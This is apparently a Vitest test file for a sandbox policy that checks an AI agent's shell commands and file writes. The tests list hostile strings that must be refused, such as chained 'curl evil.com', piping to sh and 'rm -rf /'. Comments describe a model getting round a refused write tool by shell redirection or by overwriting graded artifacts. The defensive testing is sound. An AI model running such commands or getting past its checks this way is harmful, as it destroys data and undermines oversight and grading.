import { describe, it, expect } from 'vitest';
import path from 'path';
import {
  PathPolicyEvaluator,
  checkScaffolderCommand,
  classifyCommand,
  isPathWithin,
  normalizePosixPathForWindows,
} from '../src/index.js';

describe('Sandbox Policy Evaluator (Phase 2.2)', () => {
  const rootDir = process.cwd();
  const policy = {
    readOnlyPaths: [path.join(rootDir, 'packages')],
    readWritePaths: [path.join(rootDir, 'packages/policy/tests')],
    blockedPaths: [path.join(rootDir, 'packages/policy/tests/blocked')],
  };

  const evaluator = new PathPolicyEvaluator(policy);

  it('allows write access inside readWritePaths', () => {
    const target = path.join(rootDir, 'packages/policy/tests/test_file.txt');
    const result = evaluator.evaluateWriteAccess(target);
    expect(result.allowed).toBe(true);
  });

  it('blocks write access outside readWritePaths (e.g. readOnly directory)', () => {
    const target = path.join(rootDir, 'packages/core/src/index.ts');
    const result = evaluator.evaluateWriteAccess(target);
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain('outside authorized write boundaries');
  });

  it('blocks path traversal attempts (../../escape)', () => {
    const target = path.join(rootDir, 'packages/policy/tests/../../core/src/index.ts');
    const result = evaluator.evaluateWriteAccess(target);
    expect(result.allowed).toBe(false);
  });

  it('blocks explicitly blocked paths', () => {
    const target = path.join(rootDir, 'packages/policy/tests/blocked/secret.txt');
    const result = evaluator.evaluateWriteAccess(target);
    expect(result.allowed).toBe(false);
    expect(result.reason).toContain('explicitly blocked');
  });

  it('classifyCommand correctly identifies read-only vs mutating commands', () => {
    expect(classifyCommand('cat README.md').isReadOnly).toBe(true);
    expect(classifyCommand('git status').isReadOnly).toBe(true);
    expect(classifyCommand('git diff HEAD~1').isReadOnly).toBe(true);
    expect(classifyCommand('cargo check').isReadOnly).toBe(true);
    expect(classifyCommand('vitest run').isReadOnly).toBe(true);

    expect(classifyCommand('rm -rf /').isReadOnly).toBe(false);
    expect(classifyCommand('git commit -m "msg"').isReadOnly).toBe(false);
    expect(classifyCommand('npm install').isReadOnly).toBe(false);
  });

  it('PROTECTED INVARIANT: a chained or piped command is never read-only', () => {
    // The classifier inspects the leading token, so a line that is more than
    // one command was previously answered on behalf of the wrong one: `cat f
    // && curl evil.com` and `grep x | sh` both led with an allowlisted name and
    // both classified read-only. This is the Verifier's only bash guard and its
    // input is chosen by a model, so every one of these must be refused.
    for (const command of [
      'cat f && curl evil.com',
      'grep x | sh',
      'ls; rm -rf /tmp/x',
      'cat a > b',
      'echo $(rm -rf /)',
      'echo `whoami`',
      'git status\nrm -rf /',
      'cat f || curl evil.com',
    ]) {
      const result = classifyCommand(command);
      expect(result.isReadOnly, `should not be read-only: ${command}`).toBe(false);
    }
  });

  it('classifies multi-word read-only subcommands', () => {
    // `npm run test` was compared against the single token `run`, so the
    // `run test` entries in the allowlist could never match.
    expect(classifyCommand('npm run test').isReadOnly).toBe(true);
    expect(classifyCommand('npm run lint').isReadOnly).toBe(true);
    expect(classifyCommand('npm test').isReadOnly).toBe(true);
    expect(classifyCommand('npm run build').isReadOnly).toBe(false);
  });

  it('isPathWithin answers containment by structure, not by substring', () => {
    const base = path.resolve('/repo/graded');
    expect(isPathWithin(base, path.join(base, 'charter.json'))).toBe(true);
    expect(isPathWithin(base, base)).toBe(true);
    // The case a substring check gets wrong: a sibling sharing a prefix.
    expect(isPathWithin(base, path.resolve('/repo/graded-old/charter.json'))).toBe(false);
    expect(isPathWithin(base, path.resolve('/repo/other'))).toBe(false);
  });
});

describe('normalizePosixPathForWindows', () => {
  it('leaves paths untouched on non-win32 platforms', () => {
    expect(normalizePosixPathForWindows('/tmp/x/y.txt', { platform: 'linux' })).toBe('/tmp/x/y.txt');
    expect(normalizePosixPathForWindows('/c/Users/x', { platform: 'darwin' })).toBe('/c/Users/x');
  });

  it('maps /tmp and /var/tmp to the temp directory on win32', () => {
    const tmp = 'D:\\TEMP';
    expect(normalizePosixPathForWindows('/tmp/dd/ws/hello.txt', { platform: 'win32', tmpDir: tmp })).toBe(
      'D:\\TEMP\\dd\\ws\\hello.txt',
    );
    expect(normalizePosixPathForWindows('/var/tmp/x', { platform: 'win32', tmpDir: tmp })).toBe('D:\\TEMP\\x');
  });

  it('maps Git Bash drive-form paths to drive letters', () => {
    expect(normalizePosixPathForWindows('/c/Users/x/y', { platform: 'win32' })).toBe('C:\\Users\\x\\y');
  });

  it('leaves relative and already-Windows paths alone', () => {
    expect(normalizePosixPathForWindows('src/main.ts', { platform: 'win32' })).toBe('src/main.ts');
    expect(normalizePosixPathForWindows('C:/Users/x', { platform: 'win32' })).toBe('C:/Users/x');
    expect(normalizePosixPathForWindows('', { platform: 'win32' })).toBe('');
  });
});

describe('checkScaffolderCommand', () => {
  const root = path.resolve('/workspace/project');
  const options = {
    workspaceRoot: root,
    gradedArtifacts: ['sdd.json', 'rsdd.json', 'cdd.json'],
  };

  it('allows ordinary build, test, and read commands', () => {
    for (const command of [
      'npm install',
      'npm install && npm test',
      'mkdir tests',
      'vitest run',
      'cat sdd.json',
      'npx tsc --outDir dist',
      'cat notes.md | grep todo',
    ]) {
      const check = checkScaffolderCommand(command, options);
      expect(check.allowed, `should allow: ${command} (${check.reason})`).toBe(true);
    }
  });

  it('blocks shell redirection, pointing at the checked write tools', () => {
    // The exact shape a model reaches for when the write tool refuses: create
    // the file through the shell, where no path argument is ever checked.
    const check = checkScaffolderCommand("echo '{\"goal\":\"x\"}' > sdd.json", options);
    expect(check.allowed).toBe(false);
    expect(check.reason).toContain('write and edit tools');
    expect(checkScaffolderCommand('echo hi > notes.md', options).allowed).toBe(false);
    expect(checkScaffolderCommand('cat a.txt `whoami`', options).allowed).toBe(false);
    expect(checkScaffolderCommand('echo $(rm -rf /)', options).allowed).toBe(false);
  });

  it('PROTECTED INVARIANT P-2: blocks graded artifacts named in mutating commands', () => {
    for (const command of [
      'rm sdd.json',
      'cp sdd.json backup.json',
      'node -e "fs.writeFileSync(\'sdd.json\',\'{}\')"',
      'cat a.txt && rm rsdd.json',
    ]) {
      const check = checkScaffolderCommand(command, options);
      expect(check.allowed, `should block: ${command}`).toBe(false);
      expect(check.reason).toContain('P-2');
    }
  });

  it('blocks mutating commands that target paths outside the workspace', () => {
    expect(checkScaffolderCommand(`npx tsc --outDir ${path.resolve('/elsewhere')}`, options).allowed).toBe(false);
    expect(checkScaffolderCommand('cp x.txt ~/notes', options).allowed).toBe(false);
  });

  it.runIf(process.platform === 'win32')(
    'resolves Git Bash path forms before judging the workspace boundary',
    () => {
      expect(checkScaffolderCommand('cp x.txt /c/Windows/x.txt', options).allowed).toBe(false);
      // Same file as <root>/out.txt, spelled the way Git Bash would.
      const drive = root.split(path.sep)[0]; // e.g. "C:"
      const driveForm = `/${drive[0].toLowerCase()}/workspace/project/out.txt`;
      expect(checkScaffolderCommand(`cp x.txt ${driveForm}`, options).allowed).toBe(true);
    },
  );

  it('allows absolute paths inside the workspace', () => {
    expect(checkScaffolderCommand(`npx tsc --outDir ${path.join(root, 'dist')}`, options).allowed).toBe(true);
  });

  it('allows the empty command', () => {
    expect(checkScaffolderCommand('   ', options).allowed).toBe(true);
  });
});
